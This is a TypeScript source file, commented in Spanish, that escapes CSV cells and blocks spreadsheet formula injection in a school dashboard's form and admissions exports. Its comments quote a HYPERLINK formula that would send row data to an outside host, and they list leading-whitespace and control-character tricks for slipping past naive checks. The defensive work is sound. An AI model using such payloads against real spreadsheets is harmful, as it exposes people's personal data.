/**
 * Una celda de CSV, escapada y sin fórmulas.
 *
 * Las dos exportaciones del panel —respuestas de formularios y admisiones—
 * tenían cada una su propia función de escape, y ninguna de las dos hacía lo
 * que de verdad hace falta aquí.
 *
 * ## Por qué escapar no basta
 *
 * Escapar comas y comillas produce un CSV **correcto**. El problema no es el
 * formato: es que Excel, Numbers y Google Sheets tratan como **fórmula** toda
 * celda que empiece por `=`, `+`, `-` o `@`.
 *
 * Y el contenido viene de fuera. Cualquiera rellena un formulario público del
 * sitio con `=HYPERLINK("http://…?"&A1,"Ver")` en un campo de texto, sin
 * cuenta y sin permisos. Secretaría exporta las respuestas, abre el archivo, y
 * la fórmula se evalúa con los datos personales de la hoja al lado. Lo único
 * que hace falta es que alguien del colegio pulse el botón que existe
 * justamente para eso.
 *
 * ## Qué hace
 *
 * Antepone una comilla simple, que es la marca de «esto es texto» de las hojas
 * de cálculo, para que la celda no se evalúe.
 *
 * ## Lo que cuesta, y no está medido
 *
 * **No sabemos si la comilla se ve.** Al escribir en una celda es invisible;
 * al ABRIR un CSV, hay programas que la muestran literal. Nadie lo ha
 * comprobado todavía en Excel de Windows, Numbers ni Google Sheets, así que
 * hay que contar con que los teléfonos salgan como `'+593987654321`.
 *
 * Afecta a todo lo que empiece por `+` o `-`: teléfonos ecuatorianos con
 * prefijo, y los números negativos de un campo numérico con mínimo bajo cero
 * —que el constructor de formularios permite—, que además dejan de sumarse
 * como números. Se acepta porque **un CSV feo se nota y una fórmula ejecutada
 * no**, pero es una decisión, no un efecto secundario que nadie vio venir.
 *
 * ## Lo que esto NO cubre
 *
 * Protege el archivo, no el dato. Si alguien copia una celda del CSV abierto y
 * la pega en otra hoja, se pega la fórmula y **sí se evalúa**. Igual si
 * selecciona la tabla de respuestas en pantalla o en el correo interno y la
 * pega en Excel: eso no pasa por aquí.
 *
 * ⚠️ Y si algún día algo del proyecto **vuelve a leer** estos CSV, la comilla
 * llega como carácter literal y hay que quitarla. Hoy no hay ningún lector.
 */

/** Los cuatro caracteres con los que empieza una fórmula. */
const ABRE_FORMULA = /^[=+\-@]/;

/**
 * Lo que hay que descontar antes de mirar si abre fórmula.
 *
 * Mirar solo el carácter de la posición cero **no basta**, y es un agujero de
 * coste cero: basta con teclear un espacio delante. `␣=HYPERLINK(…)` pasaría
 * sin tocar, y los importadores que recortan el blanco inicial —Google Sheets
 * al importar, LibreOffice con «recortar espacios»— se quedan con la fórmula
 * viva. Excel abriendo el `.csv` directo sí la deja como texto, así que el
 * hueco era parcial; parcial es suficiente.
 *
 * Van también el espacio duro, el BOM y los caracteres de control, que no se
 * ven al leer una respuesta en pantalla.
 *
 * ⚠️ **Esta lista es un contrato, no un adorno.** El proyecto no tiene runner
 * de pruebas, así que estos ocho casos son lo único que la sostiene. Si alguien
 * simplifica la expresión por barroca, todos vuelven a pasar y nada avisa:
 *
 *   1. espacio delante          5. nulo (U+0000) delante
 *   2. espacio duro (U+00A0)    6. BOM (U+FEFF) delante
 *   3. tabulacion vertical      7. varios espacios seguidos
 *   4. avance de pagina         8. espacio + el ataque real de la ficha
 *
 * Los ocho pasaban antes del 2026-08-19 y ninguno cuesta más que teclear un
 * espacio.
 */
const INVISIBLE_INICIAL = /^[\s\u0000-\u001F\u00A0\uFEFF]+/;

/**
 * Y los que arrancan con un invisible, se neutralizan igual aunque después no
 * venga fórmula: un tabulador o un salto delante son formas conocidas de colar
 * contenido en la celda de al lado, y en un nombre o un comentario no pintan
 * nada.
 */
const ARRANCA_INVISIBLE = /^[\t\r\n]/;

export function celdaCsv(valor: string | null | undefined): string {
  let s = String(valor ?? "");

  // Se mira el valor sin sus invisibles de delante, pero la comilla se antepone
  // al valor ENTERO: recortarlo cambiaría el dato que el colegio ve.
  const desnudo = s.replace(INVISIBLE_INICIAL, "");

  // Primero neutralizar, después escapar: al revés, la comilla simple acabaría
  // dentro de las comillas dobles y se vería en la celda.
  if (ABRE_FORMULA.test(desnudo) || ARRANCA_INVISIBLE.test(s)) s = `'${s}`;

  if (/[",\n\r]/.test(s)) s = `"${s.replace(/"/g, '""')}"`;

  return s;
}

/**
 * El BOM que Excel en Windows necesita para leer el archivo como UTF-8.
 *
 * Sin él, «Cómo se enteró» o «Año escolar» llegan con la codificación rota.
 * Va aparte y con nombre para que la próxima exportación no se olvide: la de
 * admisiones lo estuvo sin durante meses mientras la de formularios sí lo
 * ponía, y la diferencia no se ve hasta que alguien abre el archivo en un
 * Windows.
 */
export const BOM_UTF8 = "﻿";
